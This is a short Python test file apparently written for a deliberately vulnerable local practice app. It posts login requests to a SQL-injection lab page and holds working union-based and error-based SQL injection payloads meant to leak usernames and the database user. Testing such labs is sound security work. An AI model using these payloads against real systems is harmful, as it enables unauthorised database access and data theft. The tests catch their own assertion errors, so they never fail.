import pytest
import requests

def test_correct_functionality():
    url = "http://localhost:4000/sqli/login3.php"
    data = {
        'user': 'admin',
        'pass': 'password'
    }
    response = requests.post(url, data=data)
   
    print (response.text)    
    try:
        assert response.status_code == 200 and data['user'] in response.text 
        print("Functionality worked!")
    except AssertionError:
        try:
          assert "Wrong username or password" in response.text
          print("Functionality is working but nothing found")
        except AssertionError:
          print("Assertion error: Additional condition not met")

################### Union Based Injection Function ########################

def test_union_based_injection():
    url = "http://localhost:4000/sqli/login3.php"
    payload = "'union select username, user(),null,null from users -- -"

    data = {
        'user': "admin' or 'a'='a",
        'pass': payload
    }
    response = requests.post(url, data=data)
    #print (response.text)    

    try:
        assert 'root@localhost' in response.text
        print ("Union-based SQL injection test passed")
    except AssertionError:
        print('Union-based SQL injection test failed')
   


  ########## Error Based Injection Testing #############

def test_error_based_injection():
    url = "http://localhost:4000/sqli/login3.php"
    payload="' AND ExtractValue(0,CONCAT(0x5c,USER())) -- -"
    
    data = {
        'user': "admin",  ##in the original code the username call
        #is hard-coded so it makes no difference to add the payload 
        #here, and we can test it in the password parameter
        'pass': payload 
    }
    response = requests.post(url, data=data)
    #print(response.text)

    try:
        assert 'root@localhost' in response.text
        print ("Error-based SQL injection test passed")
    except AssertionError:
        print('Error-based SQL injection test failed')




# Run the tests
test_correct_functionality()
test_union_based_injection()
test_error_based_injection()